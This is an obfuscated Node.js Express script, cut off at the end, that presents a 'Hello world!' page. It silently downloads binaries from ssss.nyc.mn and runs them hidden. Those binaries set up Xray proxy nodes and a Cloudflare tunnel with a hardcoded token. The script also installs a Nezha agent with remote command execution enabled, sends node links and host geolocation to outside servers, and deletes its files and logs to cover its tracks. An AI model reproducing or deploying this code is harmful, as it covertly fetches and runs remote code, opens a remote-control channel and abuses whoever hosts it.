const _0x27f53b=_0x5e43;(function(_0x444c69,_0x292258){const _0x468aef=_0x5e43,_0xdb81b2=_0x444c69();while(!![]){try{const _0x4c0970=-parseInt(_0x468aef(0x237))/0x1*(-parseInt(_0x468aef(0x1fd))/0x2)+-parseInt(_0x468aef(0x1f9))/0x3*(-parseInt(_0x468aef(0x254))/0x4)+parseInt(_0x468aef(0x23d))/0x5+-parseInt(_0x468aef(0x26c))/0x6*(parseInt(_0x468aef(0x1af))/0x7)+-parseInt(_0x468aef(0x1c7))/0x8*(-parseInt(_0x468aef(0x205))/0x9)+parseInt(_0x468aef(0x24d))/0xa+parseInt(_0x468aef(0x230))/0xb*(-parseInt(_0x468aef(0x217))/0xc);if(_0x4c0970===_0x292258)break;else _0xdb81b2['push'](_0xdb81b2['shift']());}catch(_0xdb0ca6){_0xdb81b2['push'](_0xdb81b2['shift']());}}}(_0xf924,0x61fbd));const express=require(_0x27f53b(0x25b)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x27f53b(0x22f)),{promisify}=require(_0x27f53b(0x1e0)),exec=promisify(require(_0x27f53b(0x21b))[_0x27f53b(0x1ee)]),{execSync}=require(_0x27f53b(0x21b)),UPLOAD_URL=process[_0x27f53b(0x268)][_0x27f53b(0x1db)]||'',PROJECT_URL=process[_0x27f53b(0x268)][_0x27f53b(0x228)]||'',AUTO_ACCESS=process[_0x27f53b(0x268)][_0x27f53b(0x1eb)]||![],FILE_PATH=process['env'][_0x27f53b(0x200)]||_0x27f53b(0x1d3),SUB_PATH=process[_0x27f53b(0x268)]['SUB_PATH']||_0x27f53b(0x250),PORT=process[_0x27f53b(0x268)][_0x27f53b(0x25e)]||process['env'][_0x27f53b(0x258)]||0xbb8,UUID=process[_0x27f53b(0x268)]['UUID']||_0x27f53b(0x240),NEZHA_SERVER=process['env'][_0x27f53b(0x244)]||'',NEZHA_PORT=process[_0x27f53b(0x268)][_0x27f53b(0x224)]||'',NEZHA_KEY=process[_0x27f53b(0x268)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x27f53b(0x268)][_0x27f53b(0x20e)]||_0x27f53b(0x1e3),ARGO_AUTH=process[_0x27f53b(0x268)][_0x27f53b(0x23e)]||_0x27f53b(0x203),ARGO_PORT=process[_0x27f53b(0x268)][_0x27f53b(0x233)]||0x1f41,CFIP=process[_0x27f53b(0x268)][_0x27f53b(0x1ce)]||_0x27f53b(0x1be),CFPORT=process[_0x27f53b(0x268)][_0x27f53b(0x21e)]||0x1bb,NAME=process['env']['NAME']||_0x27f53b(0x26d);!fs['existsSync'](FILE_PATH)?(fs[_0x27f53b(0x221)](FILE_PATH),console['log'](FILE_PATH+_0x27f53b(0x234))):console['log'](FILE_PATH+_0x27f53b(0x267));function generateRandomName(){const _0x851fdd=_0x27f53b,_0x2fe8e8=_0x851fdd(0x1bf);let _0x4bb3ff='';for(let _0x2ddb9f=0x0;_0x2ddb9f<0x6;_0x2ddb9f++){_0x4bb3ff+=_0x2fe8e8[_0x851fdd(0x21c)](Math[_0x851fdd(0x24b)](Math['random']()*_0x2fe8e8['length']));}return _0x4bb3ff;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x5e43(_0x367e1f,_0x348401){_0x367e1f=_0x367e1f-0x1ae;const _0xf92481=_0xf924();let _0x5e4362=_0xf92481[_0x367e1f];return _0x5e4362;}let npmPath=path[_0x27f53b(0x25a)](FILE_PATH,npmName),phpPath=path[_0x27f53b(0x25a)](FILE_PATH,phpName),webPath=path[_0x27f53b(0x25a)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x27f53b(0x25f)),listPath=path['join'](FILE_PATH,_0x27f53b(0x256)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x27f53b(0x231));function deleteNodes(){const _0x58745f=_0x27f53b;try{if(!UPLOAD_URL)return;if(!fs[_0x58745f(0x225)](subPath))return;let _0x36d20f;try{_0x36d20f=fs[_0x58745f(0x1bd)](subPath,_0x58745f(0x261));}catch{return null;}const _0x586df=Buffer[_0x58745f(0x1d6)](_0x36d20f,'base64')[_0x58745f(0x1df)](_0x58745f(0x261)),_0x90c31=_0x586df['split']('\x0a')['filter'](_0x1ab8e2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1ab8e2));if(_0x90c31[_0x58745f(0x227)]===0x0)return;return axios[_0x58745f(0x270)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x58745f(0x23c)]({'nodes':_0x90c31}),{'headers':{'Content-Type':_0x58745f(0x23a)}})['catch'](_0x3124b7=>{return null;}),null;}catch(_0xf39d48){return null;}}function cleanupOldFiles(){const _0x4ff176=_0x27f53b;try{const _0x1d5748=fs[_0x4ff176(0x247)](FILE_PATH);_0x1d5748[_0x4ff176(0x260)](_0x47f8f7=>{const _0x190901=path['join'](FILE_PATH,_0x47f8f7);try{const _0xc895c2=fs['statSync'](_0x190901);_0xc895c2['isFile']()&&fs['unlinkSync'](_0x190901);}catch(_0x5b7951){}});}catch(_0x458ff8){}}app[_0x27f53b(0x1e8)]('/',function(_0x366a8a,_0x2f338d){const _0x4be1c8=_0x27f53b;_0x2f338d[_0x4be1c8(0x1e4)](_0x4be1c8(0x1e2));});async function generateConfig(){const _0x563732=_0x27f53b,_0xd14426={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x563732(0x1fe)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x563732(0x1b9)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x563732(0x242),'dest':0xbba},{'path':_0x563732(0x208),'dest':0xbbb},{'path':_0x563732(0x241),'dest':0xbbc}]},'streamSettings':{'network':_0x563732(0x222)}},{'port':0xbb9,'listen':_0x563732(0x25d),'protocol':_0x563732(0x201),'settings':{'clients':[{'id':UUID}],'decryption':_0x563732(0x1fe)},'streamSettings':{'network':'tcp','security':_0x563732(0x1fe)}},{'port':0xbba,'listen':_0x563732(0x25d),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x563732(0x1fe)},'streamSettings':{'network':'ws','security':_0x563732(0x1fe),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x563732(0x239),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x563732(0x25d),'protocol':_0x563732(0x1d0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x563732(0x208)}},'sniffing':{'enabled':!![],'destOverride':[_0x563732(0x274),_0x563732(0x239),_0x563732(0x1f3)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x563732(0x25d),'protocol':_0x563732(0x269),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x563732(0x1fe),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x563732(0x274),_0x563732(0x239),_0x563732(0x1f3)],'metadataOnly':![]}}],'dns':{'servers':[_0x563732(0x207)]},'outbounds':[{'protocol':_0x563732(0x1f8),'tag':_0x563732(0x220)},{'protocol':_0x563732(0x253),'tag':'block'}]};fs['writeFileSync'](path[_0x563732(0x25a)](FILE_PATH,'config.json'),JSON[_0x563732(0x23c)](_0xd14426,null,0x2));}function getSystemArchitecture(){const _0x32d4bd=_0x27f53b,_0x3abf68=os['arch']();return _0x3abf68===_0x32d4bd(0x1c2)||_0x3abf68==='arm64'||_0x3abf68===_0x32d4bd(0x1b7)?'arm':_0x32d4bd(0x266);}function downloadFile(_0x2b909c,_0x496bfa,_0x43703c){const _0x1cdcfc=_0x27f53b,_0x4839da=_0x2b909c;!fs[_0x1cdcfc(0x225)](FILE_PATH)&&fs[_0x1cdcfc(0x221)](FILE_PATH,{'recursive':!![]});const _0x591f81=fs[_0x1cdcfc(0x209)](_0x4839da);axios({'method':_0x1cdcfc(0x1e8),'url':_0x496bfa,'responseType':_0x1cdcfc(0x1ea)})[_0x1cdcfc(0x1c1)](_0x359b36=>{const _0x5d71c2=_0x1cdcfc;_0x359b36[_0x5d71c2(0x1dc)]['pipe'](_0x591f81),_0x591f81['on'](_0x5d71c2(0x21a),()=>{const _0x49c9ad=_0x5d71c2;_0x591f81[_0x49c9ad(0x1e1)](),console['log'](_0x49c9ad(0x1ef)+path[_0x49c9ad(0x1cb)](_0x4839da)+_0x49c9ad(0x22d)),_0x43703c(null,_0x4839da);}),_0x591f81['on'](_0x5d71c2(0x1ec),_0x1f4e4e=>{const _0x327c35=_0x5d71c2;fs['unlink'](_0x4839da,()=>{});const _0x50a73a=_0x327c35(0x1ef)+path['basename'](_0x4839da)+_0x327c35(0x1cf)+_0x1f4e4e[_0x327c35(0x26f)];console[_0x327c35(0x1ec)](_0x50a73a),_0x43703c(_0x50a73a);});})[_0x1cdcfc(0x1ae)](_0x2db241=>{const _0x4f2ab2=_0x1cdcfc,_0x3e2c62=_0x4f2ab2(0x1ef)+path['basename'](_0x4839da)+_0x4f2ab2(0x1cf)+_0x2db241[_0x4f2ab2(0x26f)];console['error'](_0x3e2c62),_0x43703c(_0x3e2c62);});}async function downloadFilesAndRun(){const _0x52b5a5=_0x27f53b,_0x227d76=getSystemArchitecture(),_0x3975a9=getFilesForArchitecture(_0x227d76);if(_0x3975a9['length']===0x0){console[_0x52b5a5(0x1de)](_0x52b5a5(0x243));return;}const _0x5b7da0=_0x3975a9[_0x52b5a5(0x1c4)](_0x55ff98=>{return new Promise((_0x594e20,_0x239210)=>{downloadFile(_0x55ff98['fileName'],_0x55ff98['fileUrl'],(_0x4e056a,_0x5332dd)=>{_0x4e056a?_0x239210(_0x4e056a):_0x594e20(_0x5332dd);});});});try{await Promise[_0x52b5a5(0x20d)](_0x5b7da0);}catch(_0x1e8c97){console[_0x52b5a5(0x1ec)](_0x52b5a5(0x24e),_0x1e8c97);return;}function _0x13366c(_0x357bdb){const _0x10acb2=_0x52b5a5,_0xbf922b=0x1fd;_0x357bdb[_0x10acb2(0x260)](_0x1d905d=>{const _0x56e897=_0x10acb2;fs['existsSync'](_0x1d905d)&&fs[_0x56e897(0x1ba)](_0x1d905d,_0xbf922b,_0x21de34=>{const _0x1ac603=_0x56e897;_0x21de34?console[_0x1ac603(0x1ec)](_0x1ac603(0x22c)+_0x1d905d+':\x20'+_0x21de34):console[_0x1ac603(0x1de)](_0x1ac603(0x272)+_0x1d905d+':\x20'+_0xbf922b['toString'](0x8));});});}const _0x2a6813=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x13366c(_0x2a6813);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x33b54f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x52b5a5(0x1c5)](':')[_0x52b5a5(0x204)]():'',_0x41ef4e=new Set([_0x52b5a5(0x1f2),_0x52b5a5(0x22b),'2096','2087',_0x52b5a5(0x1d5),_0x52b5a5(0x249)]),_0x1e39c7=_0x41ef4e[_0x52b5a5(0x262)](_0x33b54f)?_0x52b5a5(0x26a):'false',_0x4d8d93=_0x52b5a5(0x26b)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x52b5a5(0x1d9)+_0x1e39c7+_0x52b5a5(0x246)+UUID;fs[_0x52b5a5(0x271)](path[_0x52b5a5(0x25a)](FILE_PATH,_0x52b5a5(0x1da)),_0x4d8d93);const _0x5907af='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x52b5a5(0x202);try{await exec(_0x5907af),console['log'](phpName+_0x52b5a5(0x1cd)),await new Promise(_0x5ca108=>setTimeout(_0x5ca108,0x3e8));}catch(_0x271631){console[_0x52b5a5(0x1ec)](_0x52b5a5(0x238)+_0x271631);}}else{let _0x33b189='';const _0x4138b4=[_0x52b5a5(0x1f2),_0x52b5a5(0x22b),_0x52b5a5(0x1b6),_0x52b5a5(0x273),_0x52b5a5(0x1d5),_0x52b5a5(0x249)];_0x4138b4['includes'](NEZHA_PORT)&&(_0x33b189='--tls');const _0x693cb6=_0x52b5a5(0x252)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x52b5a5(0x1f6)+NEZHA_KEY+'\x20'+_0x33b189+_0x52b5a5(0x1f0);try{await exec(_0x693cb6),console['log'](npmName+_0x52b5a5(0x1cd)),await new Promise(_0x4c3e59=>setTimeout(_0x4c3e59,0x3e8));}catch(_0x119ddc){console[_0x52b5a5(0x1ec)]('npm\x20running\x20error:\x20'+_0x119ddc);}}}else console['log'](_0x52b5a5(0x1c6));const _0x51de54=_0x52b5a5(0x252)+webPath+_0x52b5a5(0x1d2)+FILE_PATH+_0x52b5a5(0x1f5);try{await exec(_0x51de54),console[_0x52b5a5(0x1de)](webName+_0x52b5a5(0x1cd)),await new Promise(_0x12730c=>setTimeout(_0x12730c,0x3e8));}catch(_0x21bc1a){console['error']('web\x20running\x20error:\x20'+_0x21bc1a);}if(fs[_0x52b5a5(0x225)](botPath)){let _0x3016f4;if(ARGO_AUTH[_0x52b5a5(0x259)](/^[A-Z0-9a-z=]{120,250}$/))_0x3016f4=_0x52b5a5(0x1fa)+ARGO_AUTH;else ARGO_AUTH[_0x52b5a5(0x259)](/TunnelSecret/)?_0x3016f4='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x52b5a5(0x1ca):_0x3016f4=_0x52b5a5(0x1c3)+FILE_PATH+_0x52b5a5(0x1b2)+ARGO_PORT;try{await exec(_0x52b5a5(0x252)+botPath+'\x20'+_0x3016f4+_0x52b5a5(0x211)),console['log'](botName+_0x52b5a5(0x1cd)),await new Promise(_0x2fdd15=>setTimeout(_0x2fdd15,0x7d0));}catch(_0x3e8fda){console[_0x52b5a5(0x1ec)](_0x52b5a5(0x212)+_0x3e8fda);}}await new Promise(_0x2b3ef2=>setTimeout(_0x2b3ef2,0x1388));}function getFilesForArchitecture(_0x4e9b8d){const _0x4f2a78=_0x27f53b;let _0x2f7bf2;_0x4e9b8d===_0x4f2a78(0x1c2)?_0x2f7bf2=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4f2a78(0x218)}]:_0x2f7bf2=[{'fileName':webPath,'fileUrl':_0x4f2a78(0x232)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x949155=_0x4e9b8d===_0x4f2a78(0x1c2)?'https://arm64.ssss.nyc.mn/agent':_0x4f2a78(0x1b3);_0x2f7bf2['unshift']({'fileName':npmPath,'fileUrl':_0x949155});}else{const _0x59131e=_0x4e9b8d==='arm'?_0x4f2a78(0x1b5):_0x4f2a78(0x229);_0x2f7bf2[_0x4f2a78(0x1b8)]({'fileName':phpPath,'fileUrl':_0x59131e});}}return _0x2f7bf2;}function argoType(){const _0x574672=_0x27f53b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x574672(0x1de)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x574672(0x21f)]('TunnelSecret')){fs[_0x574672(0x271)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3cc3b8='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x574672(0x1c5)]('\x22')[0xb]+_0x574672(0x22a)+path[_0x574672(0x25a)](FILE_PATH,_0x574672(0x264))+_0x574672(0x1fc)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x574672(0x265);fs['writeFileSync'](path['join'](FILE_PATH,_0x574672(0x215)),_0x3cc3b8);}else console['log'](_0x574672(0x26e));}async function extractDomains(){const _0x236b57=_0x27f53b;let _0x3caefd;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3caefd=ARGO_DOMAIN,console[_0x236b57(0x1de)](_0x236b57(0x251),_0x3caefd),await _0x2c6638(_0x3caefd);else try{const _0x5d5acd=fs['readFileSync'](path[_0x236b57(0x25a)](FILE_PATH,_0x236b57(0x25c)),'utf-8'),_0x4e41f8=_0x5d5acd[_0x236b57(0x1c5)]('\x0a'),_0x41d870=[];_0x4e41f8[_0x236b57(0x260)](_0x572101=>{const _0x135a7c=_0x236b57,_0x18d1af=_0x572101[_0x135a7c(0x259)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x18d1af){const _0x4fc511=_0x18d1af[0x1];_0x41d870['push'](_0x4fc511);}});if(_0x41d870[_0x236b57(0x227)]>0x0)_0x3caefd=_0x41d870[0x0],console[_0x236b57(0x1de)](_0x236b57(0x1dd),_0x3caefd),await _0x2c6638(_0x3caefd);else{console['log'](_0x236b57(0x214)),fs['unlinkSync'](path['join'](FILE_PATH,_0x236b57(0x25c)));async function _0x31850d(){const _0x15a79c=_0x236b57;try{process[_0x15a79c(0x223)]===_0x15a79c(0x1d8)?await exec(_0x15a79c(0x1e9)+botName+_0x15a79c(0x245)):await exec(_0x15a79c(0x1b0)+botName['charAt'](0x0)+']'+botName[_0x15a79c(0x1bc)](0x1)+_0x15a79c(0x1f4));}catch(_0x496ed7){}}_0x31850d(),await new Promise(_0x3d249f=>setTimeout(_0x3d249f,0xbb8));const _0x44a786='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x236b57(0x1b2)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x44a786+_0x236b57(0x211)),console[_0x236b57(0x1de)](botName+'\x20is\x20running'),await new Promise(_0x514d5d=>setTimeout(_0x514d5d,0xbb8)),await extractDomains();}catch(_0x3724a8){console[_0x236b57(0x1ec)](_0x236b57(0x212)+_0x3724a8);}}}catch(_0x5060ca){console[_0x236b57(0x1ec)](_0x236b57(0x20a),_0x5060ca);}async function _0x4cd569(){const _0x74dfe2=_0x236b57;try{const _0x5eb6db=await axios[_0x74dfe2(0x1e8)](_0x74dfe2(0x1c8),{'timeout':0xbb8});if(_0x5eb6db['data']&&_0x5eb6db[_0x74dfe2(0x1dc)][_0x74dfe2(0x210)]&&_0x5eb6db[_0x74dfe2(0x1dc)]['org'])return _0x5eb6db[_0x74dfe2(0x1dc)][_0x74dfe2(0x210)]+'_'+_0x5eb6db[_0x74dfe2(0x1dc)][_0x74dfe2(0x1bb)];}catch(_0x4c840d){try{const _0x30ac15=await axios[_0x74dfe2(0x1e8)](_0x74dfe2(0x24f),{'timeout':0xbb8});if(_0x30ac15[_0x74dfe2(0x1dc)]&&_0x30ac15['data'][_0x74dfe2(0x1ed)]===_0x74dfe2(0x1c0)&&_0x30ac15[_0x74dfe2(0x1dc)][_0x74dfe2(0x235)]&&_0x30ac15[_0x74dfe2(0x1dc)]['org'])return _0x30ac15[_0x74dfe2(0x1dc)][_0x74dfe2(0x235)]+'_'+_0x30ac15['data'][_0x74dfe2(0x1bb)];}catch(_0x28f083){}}return _0x74dfe2(0x22e);}async function _0x2c6638(_0x5abf96){const _0xafb0d7=await _0x4cd569(),_0x53445a=NAME?NAME+'-'+_0xafb0d7:_0xafb0d7;return new Promise(_0x27670a=>{setTimeout(()=>{const _0x469355=_0x5e43,_0x3ce405={'v':'2','ps':''+_0x53445a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x469355(0x1fe),'net':'ws','type':_0x469355(0x1fe),'host':_0x5abf96,'path':_0x469355(0x248),'tls':_0x469355(0x239),'sni':_0x5abf96,'alpn':'','fp':_0x469355(0x20f)},_0x2f28a2='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x469355(0x1e6)+_0x5abf96+_0x469355(0x1ff)+_0x5abf96+_0x469355(0x1d1)+_0x53445a+_0x469355(0x1e5)+Buffer['from'](JSON[_0x469355(0x23c)](_0x3ce405))[_0x469355(0x1df)](_0x469355(0x1e7))+_0x469355(0x20c)+UUID+'@'+CFIP+':'+CFPORT+_0x469355(0x216)+_0x5abf96+_0x469355(0x1ff)+_0x5abf96+_0x469355(0x263)+_0x53445a+_0x469355(0x21d);console[_0x469355(0x1de)](Buffer[_0x469355(0x1d6)](_0x2f28a2)[_0x469355(0x1df)](_0x469355(0x1e7))),fs['writeFileSync'](subPath,Buffer['from'](_0x2f28a2)[_0x469355(0x1df)](_0x469355(0x1e7))),console[_0x469355(0x1de)](FILE_PATH+_0x469355(0x23b)),uploadNodes(),app[_0x469355(0x1e8)]('/'+SUB_PATH,(_0x39f718,_0x47534b)=>{const _0x4840b1=_0x469355,_0xad28b6=Buffer[_0x4840b1(0x1d6)](_0x2f28a2)[_0x4840b1(0x1df)](_0x4840b1(0x1e7));_0x47534b['set'](_0x4840b1(0x1f7),_0x4840b1(0x236)),_0x47534b['send'](_0xad28b6);}),_0x27670a(_0x2f28a2);},0x7d0);});}}async function uploadNodes(){const _0xcf4ce2=_0x27f53b;if(UPLOAD_URL&&PROJECT_URL){const _0xa7db27=PROJECT_URL+'/'+SUB_PATH,_0x51a07d={'subscription':[_0xa7db27]};try{const _0x5d69a2=await axios[_0xcf4ce2(0x270)](UPLOAD_URL+_0xcf4ce2(0x1cc),_0x51a07d,{'headers':{'Content-Type':_0xcf4ce2(0x23a)}});return _0x5d69a2&&_0x5d69a2[_0xcf4ce2(0x1ed)]===0xc8?(console[_0xcf4ce2(0x1de)](_0xcf4ce2(0x23f)),_0x5d69a2):null;}catch(_0x15dba9){if(_0x15dba9[_0xcf4ce2(0x1b4)]){if(_0x15dba9[_0xcf4ce2(0x1b4)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x1979cc=fs[_0xcf4ce2(0x1bd)](listPath,_0xcf4ce2(0x261)),_0x5e50fd=_0x1979cc[_0xcf4ce2(0x1c5)]('\x0a')[_0xcf4ce2(0x1d7)](_0x26eeae=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xcf4ce2(0x24a)](_0x26eeae));if(_0x5e50fd[_0xcf4ce2(0x227)]===0x0)return;const _0xd39e9=JSON[_0xcf4ce2(0x23c)]({'nodes':_0x5e50fd});try{const _0x4a2fea=await axios['post'](UPLOAD_URL+_0xcf4ce2(0x1b1),_0xd39e9,{'headers':{'Content-Type':_0xcf4ce2(0x23a)}});return _0x4a2fea&&_0x4a2fea[_0xcf4ce2(0x1ed)]===0xc8?(console[_0xcf4ce2(0x1de)](_0xcf4ce2(0x1f1)),_0x4a2fea):null;}catch(_0x2eae2e){return null;}}else return;}}function _0xf924(){const _0x21ae0c=['country_code','\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','\x20>/dev/null\x202>&1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','tunnel.yml','?security=tls&sni=','12wInMHQ','https://arm64.ssss.nyc.mn/bot','push','finish','child_process','charAt','\x0a\x20\x20\x20\x20','CFPORT','includes','direct','mkdirSync','tcp','platform','NEZHA_PORT','existsSync','Error\x20in\x20startserver:','length','PROJECT_URL','https://amd64.ssss.nyc.mn/v1','\x0a\x20\x20credentials-file:\x20','8443','Empowerment\x20failed\x20for\x20','\x20successfully','Unknown','path','9904301VrzjtM','config.json','https://amd64.ssss.nyc.mn/web','ARGO_PORT','\x20is\x20created','countryCode','text/plain;\x20charset=utf-8','17HQwLeh','php\x20running\x20error:\x20','tls','application/json','/sub.txt\x20saved\x20successfully','stringify','835545vezWqq','ARGO_AUTH','Subscription\x20uploaded\x20successfully','52209010-71f4-405f-9819-626a93f2145c','/trojan-argo','/vless-argo','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','NEZHA_SERVER','.exe\x20>\x20nul\x202>&1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','readdirSync','/vmess-argo?ed=2560','2053','test','floor','del\x20/f\x20/q\x20','5978520KEQDwR','Error\x20downloading\x20files:','http://ip-api.com/json/','lwt','ARGO_DOMAIN:','nohup\x20','blackhole','4KTdwpG','automatic\x20access\x20task\x20added\x20successfully','list.txt','Skipping\x20adding\x20automatic\x20access\x20task','PORT','match','join','express','boot.log','127.0.0.1','SERVER_PORT','sub.txt','forEach','utf-8','has','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel.json','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','amd','\x20already\x20exists','env','trojan','true','\x0aclient_secret:\x20','8490fOyThi','ccc','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','message','post','writeFileSync','Empowerment\x20success\x20for\x20','2087','http','catch','1141sEfEoQ','pkill\x20-f\x20\x22[','/api/add-nodes','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://amd64.ssss.nyc.mn/agent','response','https://arm64.ssss.nyc.mn/v1','2096','aarch64','unshift','xtls-rprx-vision','chmod','org','substring','readFileSync','cdns.doon.eu.org','abcdefghijklmnopqrstuvwxyz','success','then','arm','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','map','split','NEZHA\x20variable\x20is\x20empty,skip\x20running','3784FTXWsK','https://ipapi.co/json/','http\x20server\x20is\x20running\x20on\x20port:','/tunnel.yml\x20run','basename','/api/add-subscriptions','\x20is\x20running','CFIP','\x20failed:\x20','vmess','&path=%2Fvless-argo%3Fed%3D2560#','\x20-c\x20','./tmp','rm\x20-rf\x20','2083','from','filter','win32','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','config.yaml','UPLOAD_URL','data','ArgoDomain:','log','toString','util','close','Hello\x20world!','ccc.ucbtiud.ggff.net','send','\x0a\x0avmess://','?encryption=none&security=tls&sni=','base64','get','taskkill\x20/f\x20/im\x20','stream','AUTO_ACCESS','error','status','exec','Download\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Nodes\x20uploaded\x20successfully','443','quic','\x22\x20>\x20/dev/null\x202>&1','/config.json\x20>/dev/null\x202>&1\x20&','\x20-p\x20','Content-Type','freedom','792711oiOzSK','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20>\x20nul\x202>&1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','33266UWLjhq','none','&fp=firefox&type=ws&host=','FILE_PATH','vless','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','eyJhIjoiMGI5ZTRkOTZjYjA4YThkZjNiM2QyZmY5MTAyNGI3MjIiLCJ0IjoiZjBlMGM4YTItYjVhNS00ZGQzLTg4MmItZmVjYzJhZGQ4MmQxIiwicyI6Ik5HSXdOREpoWWprdFlUQmxaUzAwT0dKakxUaGlaVGd0T1daak5EZGlNRGcwTlRFMCJ9','pop','4194dXAcMn','Add\x20automatic\x20access\x20task\x20faild:\x20','https+local://8.8.8.8/dns-query','/vmess-argo','createWriteStream','Error\x20reading\x20boot.log:','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x0atrojan://','all','ARGO_DOMAIN','firefox'];_0xf924=function(){return _0x21ae0c;};return _0xf924();}function cleanFiles(){setTimeout(()=>{const _0x303ac9=_0x5e43,_0xdf4d9=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xdf4d9[_0x303ac9(0x219)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xdf4d9[_0x303ac9(0x219)](phpPath);process['platform']==='win32'?exec(_0x303ac9(0x24c)+_0xdf4d9['join']('\x20')+_0x303ac9(0x1fb),_0x28cf16=>{console['clear'](),console['log']('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x303ac9(0x1d4)+_0xdf4d9['join']('\x20')+_0x303ac9(0x213),_0xa774c9=>{const _0x497d23=_0x303ac9;console['clear'](),console[_0x497d23(0x1de)]('App\x20is\x20running'),console['log'](_0x497d23(0x20b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x59f2b9=_0x27f53b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x59f2b9(0x1de)](_0x59f2b9(0x257));return;}try{const _0x217dd0=await axios[_0x59f2b9(0x270)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x59f2b9(0x23a)}});return console[_0x59f2b9(0x1de)](_0x59f2b9(0x255)),_0x217dd0;}catch(_0xb40d10){return console['error'](_0x59f2b9(0x206)+_0xb40d10['message']),null;}}async function startserver(){const _0x13d201=_0x27f53b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 